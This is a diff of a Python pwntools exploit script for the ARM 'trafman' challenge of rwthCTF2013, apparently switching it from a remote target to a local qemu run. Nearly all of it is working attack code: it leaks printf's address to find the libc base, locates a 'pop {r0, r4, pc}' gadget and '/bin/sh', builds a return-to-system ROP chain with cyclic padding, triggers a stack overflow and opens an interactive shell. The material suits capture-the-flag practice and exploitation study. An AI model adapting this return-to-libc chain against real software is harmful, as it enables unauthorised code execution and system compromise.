@@ -1,52 +1,51 @@
 #!/usr/bin/env python2
 #Exploit for challenge trafman of rwthCTF2013.
+#
+#Launch arm binary directly on an i386 system:
+#Ref: https://gist.github.com/zachriggle/8396235f532e1aeb146d
+#   apt-get install qemu-user-static libc6-armhf-cross
+#   mkdir /etc/qemu-binfmt
+#   ln -s /usr/arm-linux-gnueabihf /etc/qemu-binfmt/arm
+#
 #Create a directory named db next to the trafman binary.
-#Execute command nc -c ./trafman -l -p 8000 on remote ARM host(192.168.100.2 for me).
-#Pull the libc.so.6 binary from remote to local host.
 
 from pwn import *
 
-io = remote("192.168.100.2", 8000)
-bin = ELF("trafman")
-libc = ELF("libc.so.6")
-
-io.sendlineafter("Username: ", "traffic_operator")
+io = process("./trafman")
+libc = ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6")
 
 objectID = "A"*40
-#Caculate it: sp lift(0x180) + R4-R7(4*4) - Buffer_start(0x88)
-padding = "A"*(0x18c + 4*4 - 0x88)
-
-#Find it in libc.so.6
-binsh = 0x000CAA5C
 
 #Find out gadget in libc.so.6, Using ROPgadget now.
-#0x000597dc : pop {r0, r4, pc}
-pop = 0x000597dc
+#0x00058bac : pop {r0, r4, pc}
+pop = 0x00058bac
 
 #Step1: Leak libc base address.
+io.sendlineafter("Username: ", "traffic_operator")
 io.sendlineafter("number:\n", "23")
 data = io.recvline_startswith(">")
-printf_addr = int(data.split(" ")[1][2:], 16)
-libc_base = printf_addr - libc.symbols["printf"]
 
-system_addr = libc_base + libc.symbols["system"]
-binsh = libc_base + binsh
-pop = libc_base + pop
-print "[+] leak system() addr: ", hex(system_addr)
+printf_addr = int(data.split(" ")[1][2:], 16)
+libc.address = printf_addr - libc.symbols["printf"]
+
+binsh = libc.search("/bin/sh\x00").next()
+pop = libc.address + pop
 
 #Step2: Build ROP chain. return-to-system.
+# Segmentation fault at: 0x63616174
+offset = cyclic_find(p32(0x63616174))
+padding = cyclic(offset) 
 padding += p32(pop)
 padding += p32(binsh)
 padding += "AAAA"
-padding += p32(system_addr)
+padding += p32(libc.symbols["system"])
 
 #Step3: Execute Command, make a file which length is large than stack.
 io.sendlineafter("number:\n", "2")
 io.sendlineafter("):\n", objectID)
 io.sendlineafter("command:\n", padding)
 
-#Step4: Execute Get Command, triger stack overflow, spawn a shell.
+#Step4: Get Command, triger stack overflow, spawn a shell.
 io.sendlineafter("number:\n", "1")
 io.sendlineafter("command for:\n", objectID)
 io.interactive()
-
